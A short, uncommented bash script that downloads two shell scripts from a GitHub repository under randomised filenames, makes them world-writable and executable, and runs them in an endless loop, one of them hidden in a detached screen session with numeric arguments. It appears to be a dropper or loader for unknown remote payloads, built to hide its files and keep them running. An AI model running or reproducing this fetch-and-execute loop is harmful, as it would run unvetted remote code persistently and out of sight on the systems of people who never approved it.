#!/bin/bash
ran1=$(openssl rand -hex 4)
ran2=$(openssl rand -hex 6)
wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O ty$ran1.sh 
wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O rt$ran2.sh
while :
do
	
	chmod 777 ty$ran1.sh
	./ty$ran1.sh
	sleep 5
	chmod 777 rt$ran2.sh
	timeout 10m screen -dmS rt$ran2.sh ./rt$ran2.sh 65 75 
	sleep 5
done
